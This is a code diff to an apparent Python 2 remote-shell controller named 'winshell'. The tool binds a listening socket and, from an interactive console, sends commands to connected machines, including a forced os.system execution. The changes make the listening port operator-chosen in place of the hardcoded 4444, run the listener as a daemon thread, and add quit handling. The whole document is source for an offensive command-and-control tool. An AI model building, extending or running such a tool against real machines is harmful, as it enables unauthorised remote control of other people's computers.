@@ -9,11 +9,9 @@ class Network:
 		self.all_connections = []
 		self.all_addresses = []
 
-	def wait_connections(self, green, default, blue):
-		global c, address
+	def wait_connections(self, green, default, port):
+		global c, s, address
 		host = ""
-		port = 4444
-
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.bind((host, port))
 		s.listen(5)
@@ -180,9 +178,15 @@ class Console:
 		bannerfond = random.choice(bannerL)
 		bannerfond()
 		print "{}".format(self.default)
+                try:
+                    port = input("{}[*]{} Enter the port to listening: ".format(self.blue, self.default))
+                    print
+                except:
+                    print "{}[-]{} Please enter a valid port".format(self.red, self.default)
+                    exit(0)
 
-
-		t = threading.Thread(target=self.Connection.wait_connections, args=(self.green, self.default, self.blue))
+		t = threading.Thread(target=self.Connection.wait_connections, args=(self.green, self.default, port))
+                t.daemon = True
 		t.start()
 		while True:
 			menu = raw_input("{}[winshell]${} ".format(self.green, self.default))
@@ -211,7 +215,8 @@ class Console:
 					print "{}[-]{} Cannot resolve '{}' Unknow host".format(self.red, self.default, arg[1])
 
 			elif menu == "quit":
-				exit(0)
+                            print "{}[*]{} Shuting dows winshell...\n".format(self.blue, self.default)
+                            exit(0)
 
 			elif menu == "":
 				continue
@@ -256,21 +261,25 @@ class Console:
 		print " force2 <arg>     force a os.system"
 
 	def winshellI(self):
+            print
 	    while True:
 	        hostname, pwd = self.Connection.send_command("getcmd")
                 if pwd == "":
                     print
                     return
-		print
 		cmd = raw_input("{}[{} {}{}]${} ".format(self.green, hostname, self.blue, pwd, self.default))
 		if cmd == "":
 		    continue
 	
 		elif cmd == "help" or cmd == "?":
 		    self.help()
-	
+
+                elif cmd == "quit":
+                    print
+                    return
+
 		else:
-		    self.Connection.send_command(cmd, self.blue, self.green, self.red, self.default)		
+		    self.Connection.send_command(cmd, self.blue, self.green, self.red, self.default)
 def Main():
 	Winshell = Console()
 	Winshell.menu()
